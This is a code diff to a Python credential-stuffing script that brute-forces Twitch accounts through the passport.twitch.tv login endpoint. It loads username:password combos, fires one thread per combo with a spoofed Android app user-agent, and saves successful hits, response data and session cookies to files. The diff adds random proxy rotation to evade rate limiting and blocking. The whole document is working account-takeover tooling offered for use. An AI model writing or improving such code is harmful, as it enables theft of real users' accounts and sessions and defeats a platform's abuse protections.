@@ -1,3 +1,4 @@
+import random
 import threading, time, requests
 
 
@@ -10,9 +11,13 @@ class Brute:
         self.errors = 0
 
         self.combos = []
+        self.proxies = []
 
-        for __ in open('combos.txt', 'r'):
-            self.combos.append(__.rstrip())
+        for _ in open('./files/proxies.txt', 'r'):
+            self.proxies.append(_.rstrip())
+
+        for _ in open('./files/combos.txt', 'r'):
+            self.combos.append(_.rstrip())
 
         for _ in self.combos:
             threading.Thread(target=self.bruter, args=(_,)).start()
@@ -23,6 +28,8 @@ class Brute:
 
         username = loaded_set.split(":")[0]
         password = loaded_set.split(":")[1]
+
+        proxy = random.choice(self.proxies)
 
         DATA_V1 = {
             "username": username,
@@ -42,13 +49,18 @@ class Brute:
             "user-agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G973N Build/PPR1.190810.011) tv.twitch.android.app/13.0.0/1300000"
         }
 
-        response = self.login("https://passport.twitch.tv/login", json=DATA_V1, headers=PARAMS_V1)
+        PROXY_V1 = {
+               'http': proxy,
+               'https': proxy,
+            }
+
+        response = self.login("https://passport.twitch.tv/login", json=DATA_V1, headers=PARAMS_V1, proxies=PROXY_V1)
 
         if "captcha_proof" in response.text:
             self.hits += 1
-            print(loaded_set, file=open('hits.txt', 'a'))
-            print(response.json(), file=open('logs.txt', 'a'))
-            print(response.cookies, file=open('cookies.txt', 'a'))
+            print(loaded_set, file=open('./files/hits.txt', 'a'))
+            print(response.json(), file=open('./files/logs.txt', 'a'))
+            print(response.cookies, file=open('./files/cookies.txt', 'a'))
 
         elif "Please complete the CAPTCHA correctly." in response.text:
             self.rates += 1; self.errors += 1
